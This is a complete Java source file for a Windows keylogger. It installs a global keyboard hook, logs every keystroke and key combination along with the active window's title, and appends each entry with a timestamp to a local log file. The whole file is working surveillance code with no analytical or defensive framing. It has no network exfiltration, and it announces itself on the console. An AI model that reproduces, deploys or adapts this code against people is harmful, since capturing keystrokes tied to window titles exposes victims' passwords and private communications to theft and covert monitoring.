package khushi;

import com.sun.jna.Native;
import com.sun.jna.platform.win32.WinDef.HWND;
import com.sun.jna.win32.StdCallLibrary;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.HashSet;
import java.util.Set;

public class Keylogger implements NativeKeyListener
{

    private static final String DIRECTORY_PATH = "logs/";
    private static final String DATE_TIME_FORMAT = "yyyy-MM-dd-HH-mm-ss";
    private static final String LOG_TIME_FORMAT = "yyyy-MM-dd HH:mm:ss";

    private final FileWriter output;
    private final Set<String> currentlyPressedKeys = new HashSet<>();

    interface User32 extends StdCallLibrary
    {
        User32 INSTANCE = (User32) Native.load("user32", User32.class);

        int GetWindowTextA(HWND hwnd, byte[] lpString, int nMaxCount);

        HWND GetForegroundWindow();
    }

    public Keylogger()
    {
        output = initializeFileWriter();
    }

    public static void main(String[] args)
    {
        System.out.println("Keylogger started");
        try
        {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(new Keylogger());
        } catch (NativeHookException e)
        {
            e.printStackTrace();
        }
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent event)
    {
        String keyText = NativeKeyEvent.getKeyText(event.getKeyCode());
        currentlyPressedKeys.add(keyText);

        logKeyPressedEvent(keyText);
        checkForKeyCombinations();
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent event)
    {
        currentlyPressedKeys.remove(NativeKeyEvent.getKeyText(event.getKeyCode()));
    }

    private FileWriter initializeFileWriter()
    {
        String dateTime = getCurrentDateTime(DATE_TIME_FORMAT);
        String fileName = DIRECTORY_PATH + dateTime + "_keylog.txt";
        ensureDirectoryExists(DIRECTORY_PATH);

        try
        {
            return new FileWriter(fileName, true);
        } catch (IOException e)
        {
            throw new RuntimeException("Failed to initialize FileWriter.", e);
        }
    }

    private void ensureDirectoryExists(String path)
    {
        File directory = new File(path);
        if (!directory.exists())
        {
            directory.mkdirs();
        }
    }

    private void logKeyPressedEvent(String keyText)
    {
        String dateTime = getCurrentDateTime(LOG_TIME_FORMAT);
        String activeWindowTitle = getActiveWindowTitle();
        String logText;

        if (currentlyPressedKeys.size() > 1)
        {
            logText = dateTime + " - Combination of keys: " + String.join(" + ", currentlyPressedKeys)
                    + " has been pressed. Active Window: " + activeWindowTitle;
        } else
        {
            logText = dateTime + " - Pressed this key: " + keyText + ". Active Window: " + activeWindowTitle;
        }

        System.out.println(logText);
        writeToFile(logText + "\n");
    }

    private String getActiveWindowTitle()
    {
        byte[] buffer = new byte[1024];
        HWND hwnd = User32.INSTANCE.GetForegroundWindow();
        User32.INSTANCE.GetWindowTextA(hwnd, buffer, 1024);
        return Native.toString(buffer);
    }

    private void writeToFile(String text)
    {
        try
        {
            output.write(text);
            output.flush();
        } catch (IOException e)
        {
            e.printStackTrace();
        }
    }

    private String getCurrentDateTime(String pattern)
    {
        LocalDateTime now = LocalDateTime.now();
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern(pattern);
        return now.format(formatter);
    }

    private void checkForKeyCombinations()
    {
        if (currentlyPressedKeys.contains("Alt") && currentlyPressedKeys.contains("Tab"))
        {
            System.out.println("Combination of Alt + Tab keys have been used. User might have switched windows.");
        } else if (currentlyPressedKeys.contains("Meta") && currentlyPressedKeys.contains("Tab"))
        {
            System.out.println("Combination of Win + Tab keys have been used. User might have switched windows.");
        }
    }
}
